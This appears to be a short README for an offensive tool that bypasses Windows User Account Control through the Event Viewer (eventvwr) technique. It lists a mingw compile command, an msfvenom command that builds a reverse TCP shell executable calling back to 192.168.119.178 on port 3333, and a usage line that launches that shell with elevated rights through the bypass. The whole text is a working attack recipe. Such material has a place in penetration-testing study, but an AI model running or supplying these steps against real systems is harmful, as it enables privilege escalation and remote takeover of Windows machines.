
Tool to bypass UAC with eventvwr

compile
`x86_64-w64-mingw32-gcc eventvwr-bypassuac.c -o eventvwr-bypassuac-64.exe`


gerneratel exe to be executed
`msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.178 LPORT=3333 -f exe -o reverse_3333.exe`

place both exe files in the same folder. then

`eventvwr-bypassuac-64.exe reverse_3333.exe`